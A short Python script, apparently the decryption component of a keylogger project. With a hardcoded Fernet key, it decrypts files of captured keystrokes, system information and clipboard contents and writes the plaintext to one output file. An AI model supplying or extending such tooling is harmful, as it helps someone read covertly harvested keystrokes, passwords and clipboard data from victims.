from cryptography.fernet import Fernet

key = "VgwNiPId1ddoJ9PkkYxzXjHKpsWoV-7fCGoffzdskwI="

key_information = "E_Key_Logs.txt"
key_system_information = "E_System_Info.txt"
key_clipboard_information = "E_Clipboard.txt"

encrypted_files = [key_information, key_system_information, key_clipboard_information]
count = 0


for decrypting_files in encrypted_files:

    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open("Encryptor & Decryptor\\Decryption.txt", 'ab') as f:
        f.write(decrypted)

    count += 1